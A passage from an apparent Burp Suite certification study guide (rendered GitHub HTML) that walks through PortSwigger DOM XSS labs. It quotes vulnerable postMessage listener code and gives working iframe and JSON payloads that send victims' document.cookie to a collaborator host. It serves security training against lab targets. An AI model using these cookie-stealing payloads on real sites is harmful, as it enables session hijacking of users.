class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003elocation\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e'https://OASTIFY.COM/?domxss='\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e+\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003edocument\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003ecookie\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003escript\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e//\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/dom-xss.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/dom-xss.png\" alt=\"dom-xss\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element\" rel=\"nofollow\"\u003ePortSwigger Lab: DOM XSS in document.write sink using source location.search inside a select element\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eDOM XSS JSON.parse web messages\u003c/h3\u003e\u003ca id=\"user-content-dom-xss-jsonparse-web-messages\" class=\"anchor\" aria-label=\"Permalink: DOM XSS JSON.parse web messages\" href=\"#dom-xss-jsonparse-web-messages\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eTarget use web messaging and parses the message as JSON.\u003cbr\u003e\nExploiting the vulnerability by constructing an HTML page on the exploit server,\u003cbr\u003e\nthat exploits DOM XSS vulnerability.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch4 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eRequirements to steal cookie using this method: same-origin execution and non-HttpOnly cookies\u003c/h4\u003e\u003ca id=\"user-content-requirements-to-steal-cookie-using-this-method-same-origin-execution-and-non-httponly-cookies\" class=\"anchor\" aria-label=\"Permalink: Requirements to steal cookie using this method: same-origin execution and non-HttpOnly cookies\" href=\"#requirements-to-steal-cookie-using-this-method-same-origin-execution-and-non-httponly-cookies\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eRabbit hole:\u003c/strong\u003e The CORS policy \u003ccode\u003eNo Access-Control-Allow-Origin\u003c/code\u003eheader block access for Collaborator from able to access to fetch and cookie need insecure flags, look out \u003cem\u003e\u003cstrong\u003eNeo\u003c/strong\u003e\u003c/em\u003e the Matrix.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThe vulnerable JavaScript code on the target using event listener that listens for a web message.\u003cbr\u003e\nThis event listener expects a \u003cstrong\u003estring\u003c/strong\u003e that is parsed using \u003cstrong\u003eJSON.parse()\u003c/strong\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eIdentify the \u003ccode\u003eJSON.parse()\u003c/code\u003e in page code:\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/JSON_parse_web_messages.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/JSON_parse_web_messages.png\" alt=\"JSON_parse_web_messages.png\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eIn the JavaScript below, \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e the event listener expects a \u003cstrong\u003etype\u003c/strong\u003e property\u003cbr\u003e\nand that the \u003cstrong\u003eload-channel\u003c/strong\u003e case of the \u003cstrong\u003eswitch\u003c/strong\u003e statement changes the \u003cstrong\u003eimg src\u003c/strong\u003e attribute.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003cem\u003e\u003cstrong\u003eIdentify\u003c/strong\u003e\u003c/em\u003e web messages on target that is using \u003ccode\u003epostmessage()\u003c/code\u003e with \u003cstrong\u003eDOM Invader\u003c/strong\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-js notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;script\u0026gt;\n\twindow.addEventListener('message', function(e) {\n\t\tvar img = document.createElement('img'), ACMEplayer = {element: img}, d;\n\t\tdocument.body.appendChild(img);\n\t\ttry {\n\t\t\td = JSON.parse(e.data);\n\t\t} catch(e) {\n\t\t\treturn;\n\t\t}\n\t\tswitch(d.type) {\n\t\t\tcase \u0026quot;page-load\u0026quot;:\n\t\t\t\tACMEplayer.element.scrollIntoView();\n\t\t\t\tbreak;\n\t\t\tcase \u0026quot;load-channel\u0026quot;:\n\t\t\t\tACMEplayer.element.src = d.url;\n\t\t\t\tbreak;\n\t\t\tcase \u0026quot;player-height-changed\u0026quot;:\n\t\t\t\tACMEplayer.element.style.width = d.width + \u0026quot;px\u0026quot;;\n\t\t\t\tACMEplayer.element.style.height = d.height + \u0026quot;px\u0026quot;;\n\t\t\t\tbreak;\n\t\t\tcase \u0026quot;redirect\u0026quot;:\n\t\t\t\twindow.location.replace(d.redirectUrl);\n\t\t\t\tbreak;\n\t\t}\n\t}, false);\n\u0026lt;/script\u0026gt;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c1\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003escript\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e\u0026gt;\u003c/span\u003e\n\twindow.addEventListener('message', function(e) \u003cspan class=\"pl-kos\"\u003e{\u003c/span\u003e\n\t\t\u003cspan class=\"pl-s1\"\u003evar\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eimg\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003edocument\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-en\"\u003ecreateElement\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e'img'\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e,\u003c/span\u003e \u003cspan class=\"pl-v\"\u003eACMEplayer\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-kos\"\u003e{\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003eelement\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eimg\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e}\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e,\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003ed\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e;\u003c/span\u003e\n\t\t\u003cspan class=\"pl-smi\"\u003edocument\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003ebody\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-en\"\u003eappendChild\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003eimg\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e;\u003c/span\u003e\n\t\t\u003cspan class=\"pl-k\"\u003etry\u003c/span\u003e \u003cspan class=\"pl-kos\"\u003e{\u003c/span\u003e\n\t\t\td \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eJSON\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-en\"\u003eparse\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003ee\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003edata\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e;\u003c/span\u003e\n\t\t\u003cspan class=\"pl-kos\"\u003e}\u003c/span\u003e \u003cspan class=\"pl-en\"\u003ecatch\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003ee\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e \u003cspan class=\"pl-kos\"\u003e{\u003c/span\u003e\n\t\t\treturn\u003cspan class=\"pl-kos\"\u003e;\u003c/span\u003e\n\t\t\u003cspan class=\"pl-kos\"\u003e}\u003c/span\u003e\n\t\t\u003cspan class=\"pl-en\"\u003eswitch\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003ed\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003etype\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e \u003cspan class=\"pl-kos\"\u003e{\u003c/span\u003e\n\t\t\t\u003cspan class=\"pl-s1\"\u003ecase\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\"page-load\"\u003c/span\u003e:\n\t\t\t\t\u003cspan class=\"pl-v\"\u003eACMEplayer\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003eelement\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-en\"\u003escrollIntoView\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e;\u003c/span\u003e\n\t\t\t\t\u003cspan class=\"pl-k\"\u003ebreak\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e;\u003c/span\u003e\n\t\t\t\u003cspan class=\"pl-k\"\u003ecase\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\"load-channel\"\u003c/span\u003e:\n\t\t\t\t\u003cspan class=\"pl-v\"\u003eACMEplayer\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003eelement\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003esrc\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003ed\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003eurl\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e;\u003c/span\u003e\n\t\t\t\t\u003cspan class=\"pl-k\"\u003ebreak\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e;\u003c/span\u003e\n\t\t\t\u003cspan class=\"pl-k\"\u003ecase\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\"player-height-changed\"\u003c/span\u003e:\n\t\t\t\t\u003cspan class=\"pl-v\"\u003eACMEplayer\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003eelement\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003estyle\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003ewidth\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003ed\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003ewidth\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e+\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\"px\"\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e;\u003c/span\u003e\n\t\t\t\t\u003cspan class=\"pl-v\"\u003eACMEplayer\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003eelement\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003estyle\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003eheight\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003ed\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003eheight\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e+\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\"px\"\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e;\u003c/span\u003e\n\t\t\t\t\u003cspan class=\"pl-k\"\u003ebreak\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e;\u003c/span\u003e\n\t\t\t\u003cspan class=\"pl-k\"\u003ecase\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\"redirect\"\u003c/span\u003e:\n\t\t\t\t\u003cspan class=\"pl-smi\"\u003ewindow\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003elocation\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-en\"\u003ereplace\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003ed\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003eredirectUrl\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e;\u003c/span\u003e\n\t\t\t\t\u003cspan class=\"pl-k\"\u003ebreak\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e;\u003c/span\u003e\n\t\t\u003cspan class=\"pl-kos\"\u003e}\u003c/span\u003e\n\t\u003cspan class=\"pl-kos\"\u003e}\u003c/span\u003e, false);\n\u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003escript\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e\u0026gt;\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eTo exploit the above \u003ccode\u003esource code\u003c/code\u003e,\u003cbr\u003e\ninject JavaScript into the \u003cstrong\u003eJSON\u003c/strong\u003e data to change \"load-channel\" field data\u003cbr\u003e\nand perform cookie stealer \u003ccode\u003edocument.cookie\u003c/code\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eHost an \u003cstrong\u003eiframe\u003c/strong\u003e on the exploit server html body, and send it to the victim,\u003cbr\u003e\nresulting in the stealing of their cookie.\u003cbr\u003e\n\u003cem\u003e\u003cstrong\u003eIF\u003c/strong\u003e\u003c/em\u003e the site CORS policy is poorly configured, then if the session cookie flags are insecurely set, the victim session cookie could be stolen and send to the Burp collaboration server.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;iframe src=\u0026quot;https://0a6800740474398f80cb03590060005e.web-security-academy.net/\u0026quot;\n        onload='this.contentWindow.postMessage(\n          JSON.stringify({\n            type: \u0026quot;load-channel\u0026quot;,\n            url: \u0026quot;javascript:fetch(`https://tzwi4eohn1xy81l4n1bv40na016suii7.oastify.com/?c=`+encodeURIComponent(document.cookie))\u0026quot;\n          }), \u0026quot;*\u0026quot;)'\u0026gt;\n\u0026lt;/iframe\u0026gt;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003eiframe\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003esrc\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003ehttps://0a6800740474398f80cb03590060005e.web-security-academy.net/\u003c/span\u003e\"\n        \u003cspan class=\"pl-c1\"\u003eonload\u003c/span\u003e='\u003cspan class=\"pl-s\"\u003ethis.contentWindow.postMessage(\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e          JSON.stringify({\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e            type: \"load-channel\",\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e            url: \"javascript:fetch(`https://tzwi4eohn1xy81l4n1bv40na016suii7.oastify.com/?c=`+encodeURIComponent(document.cookie))\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e          }), \"*\")\u003c/span\u003e'\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003eiframe\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/JSON_parse_web_messages_Exploit_server_Payload.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/JSON_parse_web_messages_Exploit_server_Payload.png\" alt=\"JSON_parse_web_messages_Exploit_server_Payload.png\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eAt the end of the iframe onload values is a \"*\", this is to indicate the target is any.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eSet an unsecured test cookie in browser using browser DEV tools console to use during tests for POC XSS\u003cbr\u003e\n\u003ca href=\"https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/payloads/CookieStealer-Payloads.md\"\u003ecookie stealer payloads\u003c/a\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-js notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"document.cookie = \u0026quot;TopSecret=UnsecureCookieValue4Peanut2025\u0026quot;;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-smi\"\u003edocument\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003ecookie\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\"TopSecret=UnsecureCookieValue4Peanut2025\"\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e;\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/JSON_parse_web_messages_Exploit_server_cookie_steal_POC.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/JSON_parse_web_messages_Exploit_server_cookie_steal_POC.png\" alt=\"JSON_parse_web_messages_Exploit_server_cookie_steal_POC.png\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse\" rel=\"nofollow\"\u003ePortSwigger Lab: DOM XSS using web messages and JSON.parse\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eDOM Invader used to identify and Testing for DOM XSS using web messages\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/dom-invader-identify-web-messages.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/dom-invader-identify-web-messages.png\" alt=\"DOM Invader identify web messages\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eReplay the post message using DOM Invader after altering the JSON data.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-json notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"{\n    \u0026quot;type\u0026quot;: \u0026quot;load-channel\u0026quot;,\n    \u0026quot;url\u0026quot;: \u0026quot;JavaScript:document.location='https://OASTIFY.COM?c='+document.cookie\u0026quot;\n}\"\u003e\u003cpre\u003e{\n    \u003cspan class=\"pl-ent\"\u003e\"type\"\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eload-channel\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e,\n    \u003cspan class=\"pl-ent\"\u003e\"url\"\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eJavaScript:document.location='https://OASTIFY.COM?c='+document.cookie\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n}\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/dom-invader-resend-web-messages.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/dom-invader-resend-web-messages.png\" alt=\"DOM Invader resend web messages\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/burp/documentation/desktop/tools/dom-invader/web-messages\" rel=\"nofollow\"\u003ePortSwigger: Identify DOM XSS using PortSwigger DOM Invader\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eDOM XSS AddEventListener JavaScript URL\u003c/h3\u003e\u003ca id=\"user-content-dom-xss-addeventlistener-javascript-url\" class=\"anchor\" aria-label=\"Permalink: DOM XSS AddEventListener JavaScript URL\" href=\"#dom-xss-addeventlistener-javascript-url\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eReviewing the page \u003ccode\u003esource code\u003c/code\u003e we \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e the \u003ccode\u003eaddeventlistener\u003c/code\u003e call for a web message but there is an \u003ccode\u003eif\u003c/code\u003e condition checking if the string contains \u003ccode\u003ehttp/s\u003c/code\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/source-code-web-message-url.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/source-code-web-message-url.png\" alt=\"source-code-web-message-url.png\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThe exploit server hosted payload below includes the \u003ccode\u003ehttps\u003c/code\u003e string, and is successful in bypassing the \u003ccode\u003eif\u003c/code\u003e condition check.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;iframe src=\u0026quot;https://TARGET.net/\u0026quot; onload=\u0026quot;this.contentWindow.postMessage('javascript:document.location=`https://OASTIFY.COM?c=`+document.cookie','*')\u0026quot;\u0026gt;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003eiframe\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003esrc\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003ehttps://TARGET.net/\u003c/span\u003e\" \u003cspan class=\"pl-c1\"\u003eonload\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003ethis.contentWindow.postMessage('javascript:document.location=`https://OASTIFY.COM?c=`+document.cookie','*')\u003c/span\u003e\"\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/DOM-XSS-AddEventListener-JavaScript-URL.png\"\u003e\u003cimg 